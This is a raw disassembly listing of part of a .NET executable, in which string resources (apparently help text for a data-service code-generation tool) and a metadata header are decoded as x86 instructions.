  404db8:	imul   ebp,DWORD PTR [esi+0x67],0x4e46012e
  404dbf:	outs   dx,DWORD PTR ds:[esi]
  404dc0:	and    BYTE PTR [ecx+0x72],ah
  404dc3:	addr16 jne 0x404e33
  404dc6:	outs   dx,BYTE PTR gs:[esi]
  404dc8:	je     0x404e3d
  404dca:	and    BYTE PTR [edi+0x65],dh
  404dcd:	jb     0x404e34
  404dcf:	and    BYTE PTR [edi+0x69],ah
  404dd2:	jbe    0x404e39
  404dd4:	outs   dx,BYTE PTR ds:[esi]
  404dd5:	sub    al,0x20
  404dd7:	jne    0x404e4c
  404dd9:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  404dde:	and    BYTE PTR [edi],ch
  404de0:	push   0x20706c65
  404de5:	popa   
  404de6:	jb     0x404e4f
  404de8:	jne    0x404e57
  404dea:	outs   dx,BYTE PTR gs:[esi]
  404dec:	je     0x404e0e
  404dee:	outs   dx,WORD PTR ds:[esi]
  404df0:	jb     0x404e12
  404df2:	jne    0x404e67
  404df4:	popa   
  404df5:	and    BYTE PTR gs:[bx+di+0x6e],ch
  404dfa:	outs   dx,WORD PTR ds:[esi]
  404dfc:	jb     0x404e6b
  404dfe:	popa   
  404dff:	je     0x404e6a
  404e01:	outs   dx,DWORD PTR ds:[esi]
  404e02:	outs   dx,BYTE PTR ds:[esi]
  404e03:	add    DWORD PTR cs:[ebp+0x54],ecx
  404e07:	push   0x61702065
  404e0c:	je     0x404e76
  404e0e:	and    BYTE PTR [edi],ah
  404e10:	jnp    0x404e42
  404e12:	jge    0x404e3b
  404e14:	and    BYTE PTR [edi+0x69],ah
  404e17:	jbe    0x404e7e
  404e19:	outs   dx,BYTE PTR ds:[esi]
  404e1a:	and    BYTE PTR [esi+0x6f],ah
  404e1d:	jb     0x404e3f
  404e1f:	je     0x404e89
  404e21:	and    BYTE PTR gs:[ecx+0x72],ah
  404e25:	addr16 jne 0x404e95
  404e28:	outs   dx,BYTE PTR gs:[esi]
  404e2a:	je     0x404e4c
  404e2c:	daa    
  404e2d:	jnp    0x404e60
  404e2f:	jge    0x404e58
  404e31:	and    BYTE PTR [ecx+0x73],ch
  404e34:	and    BYTE PTR [esi+0x6f],ch
  404e37:	je     0x404e59
  404e39:	popa   
  404e3a:	and    BYTE PTR [esi+0x61],dh
  404e3d:	ins    BYTE PTR es:[edi],dx
  404e3e:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x20656c69
  404e46:	outs   dx,DWORD PTR ds:[esi]
  404e47:	jb     0x404e69
  404e49:	imul   esi,DWORD PTR fs:[edx+0x65],0x726f7463
  404e51:	jns    0x404e81
  404e53:	add    DWORD PTR [edi+0x65685401],edi
  404e59:	and    BYTE PTR [ecx+0x72],ah
  404e5c:	addr16 jne 0x404ecc
  404e5f:	outs   dx,BYTE PTR gs:[esi]
  404e61:	je     0x404e83
  404e63:	daa    
  404e64:	jnp    0x404e96
  404e66:	jge    0x404e8f
  404e68:	and    BYTE PTR [ebx+0x70],dh
  404e6b:	arpl   WORD PTR gs:[ecx+0x66],bp
  404e6f:	imul   esp,DWORD PTR [ebp+0x73],0x7d317b20
  404e76:	and    BYTE PTR [esi+0x69],ah
  404e79:	ins    BYTE PTR es:[edi],dx
  404e7a:	gs jae 0x404eab
  404e7d:	and    BYTE PTR [eax],ah
  404e7f:	inc    ebp
  404e80:	js     0x404ee3
  404e82:	arpl   WORD PTR [esp+ebp*2+0x79],si
  404e86:	and    BYTE PTR [edi+0x6e],ch
  404e89:	and    BYTE PTR gs:[esi+0x69],ah
  404e8d:	ins    BYTE PTR es:[edi],dx
  404e8e:	and    BYTE PTR gs:[ebx+0x68],dh
  404e92:	outs   dx,DWORD PTR ds:[esi]
  404e93:	jne    0x404f01
  404e95:	and    BYTE PTR fs:[edx+0x65],ah
  404e99:	and    BYTE PTR [ebx+0x70],dh
  404e9c:	arpl   WORD PTR gs:[ecx+0x66],bp
  404ea0:	imul   esp,DWORD PTR [ebp+0x64],0x726f6620
  404ea7:	and    BYTE PTR [ecx+0x72],ah
  404eaa:	addr16 jne 0x404f1a
  404ead:	outs   dx,BYTE PTR gs:[esi]
  404eaf:	je     0x404ed1
  404eb1:	daa    
  404eb2:	jnp    0x404ee4
  404eb4:	jge    0x404edd
  404eb6:	and    BYTE PTR cs:[ecx+0x66],cl
  404eba:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404ebe:	and    BYTE PTR [ecx+0x72],ah
  404ec1:	addr16 jne 0x404f31
  404ec4:	outs   dx,BYTE PTR gs:[esi]
  404ec6:	je     0x404ee8
  404ec8:	imul   esi,DWORD PTR [ebx+0x20],0x69642061
  404ecf:	jb     0x404f36
  404ed1:	arpl   WORD PTR [edi+ebp*2+0x72],si
  404ed5:	jns    0x404ef7
  404ed7:	bound  esp,QWORD PTR [ebp+0x20]
  404eda:	jae    0x404f51
  404edc:	jb     0x404f43
  404ede:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404ee2:	jb     0x404f49
  404ee4:	and    BYTE PTR [ecx+0x73],ch
  404ee7:	and    BYTE PTR [edi+0x6e],ch
  404eea:	ins    BYTE PTR es:[edi],dx
  404eeb:	jns    0x404f0d
  404eed:	outs   dx,DWORD PTR ds:[esi]
  404eee:	outs   dx,BYTE PTR ds:[esi]
  404eef:	and    BYTE PTR gs:[esi+0x69],ah
  404ef3:	ins    BYTE PTR es:[edi],dx
  404ef4:	and    BYTE PTR gs:[edi+0x69],dh
  404ef8:	je     0x404f62
  404efa:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404efe:	and    BYTE PTR [ebp+0x78],ah
  404f01:	je     0x404f68
  404f03:	outs   dx,BYTE PTR ds:[esi]
  404f04:	jae    0x404f6f
  404f06:	outs   dx,DWORD PTR ds:[esi]
  404f07:	outs   dx,BYTE PTR ds:[esi]
  404f08:	and    BYTE PTR [edi],ah
  404f0a:	jnp    0x404f3e
  404f0c:	jge    0x404f35
  404f0e:	and    BYTE PTR [ecx+0x6e],ch
  404f11:	and    BYTE PTR [ecx+0x74],ch
  404f14:	add    DWORD PTR cs:[ebp+0x54],ecx
  404f18:	push   0x69642065
  404f1d:	jb     0x404f84
  404f1f:	arpl   WORD PTR [edi+ebp*2+0x72],si
  404f23:	jns    0x404f45
  404f25:	daa    
  404f26:	jnp    0x404f58
  404f28:	jge    0x404f51
  404f2a:	and    BYTE PTR [ebx+0x70],dh
  404f2d:	arpl   WORD PTR gs:[ecx+0x66],bp
  404f31:	imul   esp,DWORD PTR [ebp+0x64],0x206e6920
  404f38:	je     0x404fa2
  404f3a:	and    BYTE PTR gs:[ecx+0x72],ah
  404f3e:	addr16 jne 0x404fae
  404f41:	outs   dx,BYTE PTR gs:[esi]
  404f43:	je     0x404f65
  404f45:	daa    
  404f46:	jnp    0x404f79
  404f48:	jge    0x404f71
  404f4a:	and    BYTE PTR [ecx+0x73],ch
  404f4d:	and    BYTE PTR [esi+0x6f],ch
  404f50:	je     0x404f72
  404f52:	popa   
  404f53:	and    BYTE PTR [esi+0x61],dh
  404f56:	ins    BYTE PTR es:[edi],dx
  404f57:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x63657269
  404f5f:	je     0x404fd0
  404f61:	jb     0x404fdc
  404f63:	add    DWORD PTR cs:[edi],esi
  404f66:	inc    edi
  404f67:	outs   dx,BYTE PTR gs:[esi]
  404f69:	gs jb  0x404fcd
  404f6c:	je     0x404fd3
  404f6e:	and    BYTE PTR [ebx+0x6f],ah
  404f71:	ins    BYTE PTR es:[edi],dx
  404f72:	ins    BYTE PTR es:[edi],dx
  404f73:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404f78:	outs   dx,BYTE PTR ds:[esi]
  404f79:	jae    0x404f9b
  404f7b:	fs gs jb 0x404fe8
  404f7f:	jbe    0x404fe6
  404f81:	and    BYTE PTR fs:[esi+0x72],ah
  404f85:	outs   dx,DWORD PTR ds:[esi]
  404f86:	ins    DWORD PTR es:[edi],dx
  404f87:	and    BYTE PTR [ecx+eiz*2+0x74],al
  404f8b:	popa   
  404f8c:	push   ebx
  404f8d:	gs jb  0x405006
  404f90:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  404f97:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404f9c:	outs   dx,BYTE PTR ds:[esi]
  404f9d:	add    DWORD PTR [esi],edx
  404f9f:	jnp    0x404fd1
  404fa1:	jge    0x404fc3
  404fa3:	sub    BYTE PTR [ebx+0x68],dh
  404fa6:	outs   dx,DWORD PTR ds:[esi]
  404fa7:	jb     0x40501d
  404fa9:	and    BYTE PTR [esi+0x6f],ah
  404fac:	jb     0x40501b
  404fae:	cmp    ah,BYTE PTR [eax]
  404fb0:	das    
  404fb1:	jnp    0x404fe4
  404fb3:	jge    0x404fde
  404fb5:	add    DWORD PTR [esi+eiz*2],eax
  404fb8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x1],0x73694419
  404fc0:	jo     0x40502e
  404fc2:	popa   
  404fc3:	jns    0x404fe5
  404fc5:	je     0x40502f
  404fc7:	and    BYTE PTR gs:[ebp+0x73],dh
  404fcb:	popa   
  404fcc:	and    BYTE PTR gs:[di+0x65],ch
  404fd1:	jae    0x405046
  404fd3:	popa   
  404fd4:	add    DWORD PTR gs:[bp+si],ebp
  404fd8:	push   esp
  404fd9:	push   0x69662065
  404fde:	ins    BYTE PTR es:[edi],dx
  404fdf:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  404fe4:	jb     0x40504b
  404fe6:	popa   
  404fe7:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  404fec:	and    BYTE PTR [ebx+0x6f],ah
  404fef:	outs   dx,BYTE PTR ds:[esi]
  404ff0:	arpl   WORD PTR [ebp+0x70],sp
  404ff3:	je     0x40506a
  404ff5:	popa   
  404ff6:	ins    BYTE PTR es:[edi],dx
  404ff7:	and    BYTE PTR [ebp+0x6f],ch
  404ffa:	fs gs ins BYTE PTR es:[edi],dx
  404ffd:	and    BYTE PTR [esi+0x72],ah
  405000:	outs   dx,DWORD PTR ds:[esi]
  405001:	ins    DWORD PTR es:[edi],dx
  405002:	add    DWORD PTR [ebx],esp
  405004:	inc    edi
  405005:	outs   dx,BYTE PTR gs:[esi]
  405007:	gs jb  0x40506b
  40500a:	je     0x405071
  40500c:	and    BYTE PTR [ebx+0x6f],ah
  40500f:	fs and BYTE PTR gs:[ebp+0x73],dh
  405014:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  40501b:	and    BYTE PTR [ebx+0x23],al
  40501e:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  405022:	addr16 jne 0x405086
  405025:	add    DWORD PTR gs:[bp+di],esp
  405029:	inc    edi
  40502a:	outs   dx,BYTE PTR gs:[esi]
  40502c:	gs jb  0x405090
  40502f:	je     0x405096
  405031:	and    BYTE PTR [ebx+0x6f],ah
  405034:	fs and BYTE PTR gs:[ebp+0x73],dh
  405039:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  405040:	and    BYTE PTR [esi+0x42],dl
  405043:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  405047:	addr16 jne 0x4050ab
  40504a:	add    DWORD PTR gs:[bx+si],ecx
  40504e:	das    
  40504f:	jnp    0x405081
  405051:	jge    0x40508d
  405053:	jnp    0x405086
  405055:	jge    0x405058
  405057:	or     ch,BYTE PTR [edi]
  405059:	jnp    0x40508b
  40505b:	jge    0x405097
  40505d:	cmp    al,0x7b
  40505f:	xor    DWORD PTR [ebp+0x3e],edi
  405062:	add    DWORD PTR [edx],ebx
  405064:	push   ebx
  405065:	jne    0x4050d7
  405067:	jo     0x4050db
  405069:	gs jae 0x4050df
  40506c:	and    BYTE PTR [ebx+0x6f],ah
  40506f:	jo     0x4050ea
  405071:	jb     0x4050dc
  405073:	addr16 push 0x656d2074
  405079:	jae    0x4050ee
  40507b:	popa   
  40507c:	add    DWORD PTR gs:[bx],ebp
  405080:	push   esp
  405081:	push   0x69662065
  405086:	ins    BYTE PTR es:[edi],dx
  405087:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40508c:	ja     0x405100
  40508e:	imul   esi,DWORD PTR [ebp+eiz*2+0x20],0x20656874
  405096:	outs   dx,BYTE PTR gs:[si]
  405099:	gs jb  0x4050fd
  40509c:	je     0x405103
  40509e:	and    BYTE PTR fs:[edi+0x62],ch
  4050a2:	push   0x65
  4050a4:	arpl   WORD PTR [eax+eiz*1+0x6c],si
  4050a8:	popa   
  4050a9:	jns    0x405110
  4050ab:	jb     0x4050cd
  4050ad:	je     0x40511e
  4050af:	add    DWORD PTR [ebx],ecx
  4050b1:	jnp    0x4050e3
  4050b3:	jge    0x4050d5
  4050b5:	dec    edi
  4050b6:	jo     0x40512c
  4050b8:	imul   ebp,DWORD PTR [edi+0x6e],0x54290173
  4050bf:	push   0x52552065
  4050c4:	dec    ecx
  4050c5:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4050c9:	jb     0x405130
  4050cb:	popa   
  4050cc:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  4050d1:	and    BYTE PTR [ebx+0x6f],ah
  4050d4:	outs   dx,BYTE PTR ds:[esi]
  4050d5:	arpl   WORD PTR [ebp+0x70],sp
  4050d8:	je     0x40514f
  4050da:	popa   
  4050db:	ins    BYTE PTR es:[edi],dx
  4050dc:	and    BYTE PTR [ebp+0x6f],ch
  4050df:	fs gs ins BYTE PTR es:[edi],dx
  4050e2:	and    BYTE PTR [esi+0x72],ah
  4050e5:	outs   dx,DWORD PTR ds:[esi]
  4050e6:	ins    DWORD PTR es:[edi],dx
  4050e7:	add    DWORD PTR [ebx],eax
  4050e9:	push   ebp
  4050ea:	push   edx
  4050eb:	dec    esp
  4050ec:	add    DWORD PTR [ebx+0x41],eax
  4050ef:	arpl   WORD PTR [ebx+0x65],sp
  4050f2:	jo     0x405168
  4050f4:	and    BYTE PTR [ebx+0x53],al
  4050f7:	inc    esp
  4050f8:	dec    esp
  4050f9:	and    BYTE PTR [edi+ebp*2+0x63],ah
  4050fd:	jne    0x40516c
  4050ff:	outs   dx,BYTE PTR gs:[esi]
  405101:	je     0x405176
  405103:	and    BYTE PTR [ecx+eiz*2+0x67],dh
  405107:	gs and BYTE PTR fs:[bx+0x69],dh
  40510d:	je     0x405177
  40510f:	and    BYTE PTR [ebp+0x3a],ch
  405112:	inc    esp
  405113:	popa   
  405114:	je     0x405177
  405116:	push   ebx
  405117:	gs jb  0x405190
  40511a:	imul   esp,DWORD PTR [ebx+0x65],0x73726556
  405121:	imul   ebp,DWORD PTR [edi+0x6e],0x302e313d
  405128:	and    BYTE PTR [edi+0x72],ch
  40512b:	and    BYTE PTR [edi+ebp*2+0x77],ch
  40512f:	gs jb  0x405133
  405132:	inc    ebx
  405133:	inc    ecx
  405134:	arpl   WORD PTR [ebx+0x65],sp
  405137:	jo     0x4051ad
  405139:	and    BYTE PTR [ebx+0x53],al
  40513c:	inc    esp
  40513d:	dec    esp
  40513e:	and    BYTE PTR [edi+ebp*2+0x63],ah
  405142:	jne    0x4051b1
  405144:	outs   dx,BYTE PTR gs:[esi]
  405146:	je     0x4051bb
  405148:	and    BYTE PTR [ecx+eiz*2+0x67],dh
  40514c:	gs and BYTE PTR fs:[bx+0x69],dh
  405152:	je     0x4051bc
  405154:	and    BYTE PTR [ebp+0x3a],ch
  405157:	inc    esp
  405158:	popa   
  405159:	je     0x4051bc
  40515b:	push   ebx
  40515c:	gs jb  0x4051d5
  40515f:	imul   esp,DWORD PTR [ebx+0x65],0x73726556
  405166:	imul   ebp,DWORD PTR [edi+0x6e],0x302e323d
  40516d:	and    BYTE PTR [edi+0x72],ch
  405170:	and    BYTE PTR [edi+ebp*2+0x77],ch
  405174:	gs jb  0x405178
  405177:	push   0x6974704f
  40517c:	outs   dx,DWORD PTR ds:[esi]
  40517d:	outs   dx,BYTE PTR ds:[esi]
  40517e:	and    BYTE PTR [edi],ah
  405180:	inc    esp
  405181:	popa   
  405182:	je     0x4051e5
  405184:	push   ebx
  405185:	gs jb  0x4051fe
  405188:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  40518f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405194:	outs   dx,BYTE PTR ds:[esi]
  405195:	daa    
  405196:	and    BYTE PTR [ebx+0x61],ah
  405199:	outs   dx,BYTE PTR ds:[esi]
  40519a:	and    BYTE PTR [esi+0x6f],ch
  40519d:	je     0x4051bf
  40519f:	bound  esp,QWORD PTR [ebp+0x20]
  4051a2:	jae    0x405214
  4051a4:	arpl   WORD PTR gs:[ecx+0x66],bp
  4051a8:	imul   esp,DWORD PTR [ebp+0x64],0x65687720
  4051af:	outs   dx,BYTE PTR ds:[esi]
  4051b0:	and    BYTE PTR [edi],ah
  4051b2:	push   esi
  4051b3:	gs jb  0x405229
  4051b6:	imul   ebp,DWORD PTR [edi+0x6e],0x73692027
  4051bd:	and    BYTE PTR [ebx+0x65],dh
  4051c0:	je     0x4051e2
  4051c2:	je     0x405233
  4051c4:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4051c8:	and    BYTE PTR [ebp+eiz*2+0x66],ah
  4051cc:	popa   
  4051cd:	jne    0x40523b
  4051cf:	je     0x4051f1
  4051d1:	jbe    0x405234
  4051d3:	ins    BYTE PTR es:[edi],dx
  4051d4:	jne    0x40523b
  4051d6:	and    BYTE PTR [edi+0x66],ch
  4051d9:	and    BYTE PTR [edi],ah
  4051db:	xor    DWORD PTR [esi],ebp
  4051dd:	xor    BYTE PTR [edi],ah
  4051df:	add    DWORD PTR cs:[edi+edx*2],ebx
  4051e3:	jb     0x40524e
  4051e5:	je     0x405250
  4051e7:	outs   dx,BYTE PTR ds:[esi]
  4051e8:	and    BYTE PTR [bx+0x62],ch
  4051ec:	push   0x65
  4051ee:	arpl   WORD PTR [eax+eiz*1+0x6c],si
  4051f2:	popa   
  4051f3:	jns    0x40525a
  4051f5:	jb     0x405217
  4051f7:	imul   bp,WORD PTR [ebp+eiz*2+0x2e],0x2e2e
  4051fe:	add    ebp,eax
  405200:	add    DWORD PTR [esi+0x6f],ecx
  405203:	and    BYTE PTR [esi+0x69],ah
  405206:	ins    BYTE PTR es:[edi],dx
  405207:	gs jae 0x40522a
  40520a:	ja     0x405271
  40520c:	jb     0x405273
  40520e:	and    BYTE PTR [ebx+0x70],dh
  405211:	arpl   WORD PTR gs:[ecx+0x66],bp
  405215:	imul   esp,DWORD PTR [ebp+0x64],0x726f6620
  40521c:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405220:	and    BYTE PTR [ecx+0x72],ah
  405223:	addr16 jne 0x405293
  405226:	outs   dx,BYTE PTR gs:[esi]
  405228:	je     0x40524a
  40522a:	daa    
  40522b:	jnp    0x40525d
  40522d:	jge    0x405256
  40522f:	and    BYTE PTR [edi+0x68],dh
  405232:	imul   esp,DWORD PTR [ebx+0x68],0x71657220
  405239:	jne    0x4052a4
  40523b:	jb     0x4052a2
  40523d:	jae    0x40525f
  40523f:	gs js  0x4052a3
  405242:	arpl   WORD PTR [esp+ebp*2+0x79],si
  405246:	and    BYTE PTR [edi+0x6e],ch
  405249:	and    BYTE PTR gs:[esi+0x69],ah
  40524d:	ins    BYTE PTR es:[edi],dx
  40524e:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  405253:	bound  esp,QWORD PTR [ebp+0x20]
  405256:	jae    0x4052c8
  405258:	arpl   WORD PTR gs:[ecx+0x66],bp
  40525c:	imul   esp,DWORD PTR [ebp+0x64],0x6649202e
  405263:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405267:	and    BYTE PTR [ebx+0x75],ah
  40526a:	jb     0x4052de
  40526c:	outs   dx,BYTE PTR gs:[esi]
  40526e:	je     0x405290
  405270:	popa   
  405271:	jb     0x4052da
  405273:	jne    0x4052e2
  405275:	outs   dx,BYTE PTR gs:[esi]
  405277:	je     0x405299
  405279:	jbe    0x4052dc
  40527b:	ins    BYTE PTR es:[edi],dx
  40527c:	jne    0x4052e3
  40527e:	and    BYTE PTR [ecx+0x73],ch
  405281:	and    BYTE PTR [ecx+0x20],ah
  405284:	imul   esi,DWORD PTR fs:[edx+0x65],0x726f7463
  40528c:	jns    0x4052ae
  40528e:	bound  esp,QWORD PTR [ebp+0x20]
  405291:	jae    0x405308
  405293:	jb     0x4052fa
  405295:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405299:	jb     0x405300
  40529b:	and    BYTE PTR [ecx+0x73],ch
  40529e:	and    BYTE PTR [ecx+0x20],ah
  4052a1:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6977
  4052a8:	je     0x405312
  4052aa:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4052ae:	and    BYTE PTR [ebp+0x78],ah
  4052b1:	je     0x405318
  4052b3:	outs   dx,BYTE PTR ds:[esi]
  4052b4:	jae    0x40531f
  4052b6:	outs   dx,DWORD PTR ds:[esi]
  4052b7:	outs   dx,BYTE PTR ds:[esi]
  4052b8:	and    BYTE PTR [edi],ah
  4052ba:	jnp    0x4052ed
  4052bc:	jge    0x4052e5
  4052be:	and    BYTE PTR [ecx+0x6e],ch
  4052c1:	and    BYTE PTR [ecx+0x74],ch
  4052c4:	and    BYTE PTR cs:[eax],al
  4052c7:	add    BYTE PTR [edx+0x53],al
  4052ca:	dec    edx
  4052cb:	inc    edx
  4052cc:	add    DWORD PTR [eax],eax
  4052ce:	add    DWORD PTR [eax],eax
  4052d0:	add    BYTE PTR [eax],al
  4052d2:	add    BYTE PTR [eax],al
  4052d4:	or     al,0x0
  4052d6:	add    BYTE PTR [eax],al
  4052d8:	jbe    0x40530c
  4052da:	xor    BYTE PTR cs:[esi],ch
  4052dd:	xor    eax,0x37323730
  4052e2:	add    BYTE PTR [eax],al
  4052e4:	add    BYTE PTR [eax],al
  4052e6:	add    eax,0x6c00
  4052eb:	add    BYTE PTR [eax],cl
  4052ed:	and    eax,0x7e230000
  4052f2:	add    BYTE PTR [eax],al
  4052f4:	je     0x40531b
  4052f6:	add    BYTE PTR [eax],al
  4052f8:	push   0x23000027
  4052fd:	push   ebx
  4052fe:	je     0x405372
  405300:	imul   ebp,DWORD PTR [esi+0x67],0x73
  405307:	add    ah,bl
  405309:	dec    esp
  40530a:	add    BYTE PTR [eax],al
  40530c:	mov    WORD PTR [eax],cs
  40530e:	add    BYTE PTR [eax],al
  405310:	and    edx,DWORD PTR [ebp+0x53]
  405313:	add    BYTE PTR [eax+0x55],ch
  405316:	add    BYTE PTR [eax],al
  405318:	adc    BYTE PTR [eax],al
  40531a:	add    BYTE PTR [eax],al
  40531c:	and    eax,DWORD PTR [edi+0x55]
  40531f:	dec    ecx
  405320:	inc    esp
  405321:	add    BYTE PTR [eax],al
  405323:	add    BYTE PTR [eax+0x55],bh
  405326:	add    BYTE PTR [eax],al
  405328:	adc    BYTE PTR [edi],dh
  40532a:	add    BYTE PTR [eax],al
  40532c:	and    eax,DWORD PTR [edx+0x6c]
  40532f:	outs   dx,DWORD PTR ds:[esi]
  405330:	bound  eax,QWORD PTR [eax]
  405332:	add    BYTE PTR [eax],al
  405334:	add    BYTE PTR [eax],al
  405336:	add    BYTE PTR [eax],al
  405338:	add    al,BYTE PTR [eax]
  40533a:	add    BYTE PTR [ecx],al
  40533c:	push   edi
  40533d:	pop    ds
  40533e:	mov    ds:0xb090b,al
  405343:	add    BYTE PTR [eax],al
  405345:	cli    
  405346:	add    DWORD PTR [ebx],esi
  405348:	add    BYTE PTR [esi],dl
  40534a:	add    BYTE PTR [eax],al
  40534c:	add    DWORD PTR [eax],eax
  40534e:	add    BYTE PTR [eax],al
  405350:	push   0x0
  405352:	add    BYTE PTR [eax],al
  405354:	sbb    eax,0xcb000000
  405359:	add    BYTE PTR [eax],al
  40535b:	add    BYTE PTR [eax+eax*1+0xa10000],dh
  405362:	add    BYTE PTR [eax],al
  405364:	add    eax,DWORD PTR [eax]
  405366:	add    BYTE PTR [eax],al
  405368:	ret    0x0
  40536b:	add    BYTE PTR [ecx+0x27000000],bl
  405371:	add    BYTE PTR [eax],al
  405373:	add    BYTE PTR [eax],ah
  405375:	add    BYTE PTR [eax],al
  405377:	add    BYTE PTR [esi],cl
  405379:	add    BYTE PTR [eax],al
  40537b:	add    BYTE PTR [edi+0x0],al
  40537e:	add    BYTE PTR [eax],al
  405380:	dec    esi
  405381:	add    BYTE PTR [eax],al
  405383:	add    BYTE PTR [ecx],al
  405385:	add    BYTE PTR [eax],al
  405387:	add    BYTE PTR [edi],dl
  405389:	add    BYTE PTR [eax],al
  40538b:	add    BYTE PTR [ecx],al
  40538d:	add    BYTE PTR [eax],al
  40538f:	add    BYTE PTR [eax],cl
  405391:	add    BYTE PTR [eax],al
  405393:	add    BYTE PTR [ecx],al
  405395:	add    BYTE PTR [eax],al
  405397:	add    BYTE PTR [edx],al
  405399:	add    BYTE PTR [eax],al
  40539b:	add    BYTE PTR [eax+eax*1],al
  40539e:	add    BYTE PTR [eax],al
  4053a0:	add    BYTE PTR [eax],al
  4053a2:	or     al,BYTE PTR [eax]
  4053a4:	add    DWORD PTR [eax],eax
  4053a6:	add    BYTE PTR [eax],al
  4053a8:	add    BYTE PTR [eax],al
  4053aa:	push   es
  4053ab:	add    BYTE PTR [edx+eax*1+0x60295],bl
  4053b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b3:	add    dl,BYTE PTR [ebp-0x52fff9fe]
  4053b9:	add    dl,BYTE PTR [ebp-0x48fff9fe]
  4053bf:	add    dl,BYTE PTR [ebp-0x28fff9fe]
  4053c5:	add    bh,BYTE PTR [edx+eax*1+0x2e50006]
  4053cc:	mov    esp,0x6000602
  4053d1:	add    esi,ebx
  4053d3:	add    al,BYTE PTR [esi]
  4053d5:	add    BYTE PTR [edx],dl
  4053d7:	add    edx,DWORD PTR [ebp+0x32000a02]
  4053dd:	add    ebx,DWORD PTR [ebx+eax*1]
  4053e0:	or     al,BYTE PTR [eax]
  4053e2:	inc    edi
  4053e3:	add    ebx,DWORD PTR [ebx+eax*1]
  4053e6:	push   es
  4053e7:	add    BYTE PTR [ebx+0xa04a904],bh
  4053ed:	add    bl,dh
  4053ef:	add    al,0xbc
  4053f1:	add    al,BYTE PTR [esi]
  4053f3:	add    BYTE PTR [ebp+0x6029505],cl
  4053f9:	add    BYTE PTR [edi],dl
  4053fb:	push   es
  4053fc:	mov    esp,0xee000602
  405401:	push   es
  405402:	mov    esp,0xf5000602
  405407:	push   es
  405408:	mov    esp,0xc3000e02
  40540d:	or     BYTE PTR [ebp+0x62000602],dl
  405413:	or     DWORD PTR [edx+eax*1+0x97e0006],edi
  40541a:	repz add al,BYTE PTR [esi]
  40541d:	add    dl,al
  40541f:	or     DWORD PTR [ebp+0x78001202],edx
  405425:	or     cl,BYTE PTR [esi]
  405427:	add    DWORD PTR [edx],edx
  405429:	add    BYTE PTR [ecx+0x6010e0a],bl
  40542f:	add    dl,cl
  405431:	or     bh,BYTE PTR [edx+eax*1+0xafe0016]
  405438:	in     eax,0xa
  40543a:	push   ss
  40543b:	add    BYTE PTR [eax],dh
  40543d:	or     esp,ebp
  40543f:	or     cl,BYTE PTR [edx]
  405441:	add    bh,al
  405443:	push   cs
  405444:	xchg   ebp,eax
  405445:	add    al,BYTE PTR [esi]
  405447:	add    BYTE PTR [esi],ch
  405449:	sbb    bl,BYTE PTR ds:0x6700061a
  40544f:	sbb    dl,BYTE PTR [edx+0x1a]
  405452:	push   es
  405453:	add    BYTE PTR [ebx+0x1b],al
  405456:	and    al,0x1b
  405458:	push   es
  405459:	add    BYTE PTR [ebx],dh
  40545b:	sbb    eax,0x60295
  405460:	inc    edi
  405461:	sbb    eax,0x61b24
  405466:	pop    ebx
  405467:	sbb    eax,0x60295
  40546c:	jno    0x40548b
  40546e:	test   eax,0x88000604
  405473:	sbb    eax,0x604a9
  405478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405479:	sbb    eax,0x604a9
  40547e:	ret    
  40547f:	sbb    eax,0x604a9
  405484:	fcomp  QWORD PTR ds:0x604a9
  40548a:	cmc    
  40548b:	sbb    eax,0x604a9
  405490:	adc    BYTE PTR [esi],bl
  405492:	test   eax,0x29000604
  405497:	push   ds
  405498:	test   eax,0x46000604
  40549d:	push   ds
  40549e:	test   eax,0x6c000604
  4054a3:	push   ds
  4054a4:	sbb    eax,0x8e00061a
  4054a9:	push   ds
  4054aa:	sbb    eax,0xb000061a
  4054af:	push   ds
  4054b0:	test   eax,0xcb000604
  4054b5:	push   ds
  4054b6:	test   eax,0xf7000604
  4054bb:	push   ds
  4054bc:	in     al,0x1e
  4054be:	mov    ebx,0x1f0b00
  4054c3:	add    BYTE PTR [esi],al
  4054c5:	add    BYTE PTR [edx],bh
  4054c7:	pop    ds
  4054c8:	sbb    bl,BYTE PTR [edi]
  4054ca:	push   es
  4054cb:	add    BYTE PTR [edx+0x1f],bl
  4054ce:	sbb    bl,BYTE PTR [edi]
  4054d0:	push   es
  4054d1:	add    BYTE PTR [eax+0x1f],bh
  4054d4:	xchg   ebp,eax
  4054d5:	add    al,BYTE PTR [esi]
  4054d7:	add    BYTE PTR [eax+0x602951f],dl
  4054dd:	add    BYTE PTR [ecx+0x602951f],ah
  4054e3:	add    dl,dl
  4054e5:	pop    ds
  4054e6:	test   eax,0xec000604
  4054eb:	pop    ds
  4054ec:	xchg   ebp,eax
  4054ed:	add    al,BYTE PTR [esi]
  4054ef:	add    bh,bh
  4054f1:	pop    ds
  4054f2:	xchg   ebp,eax
  4054f3:	add    al,BYTE PTR [esi]
  4054f5:	add    BYTE PTR [ebx],ah
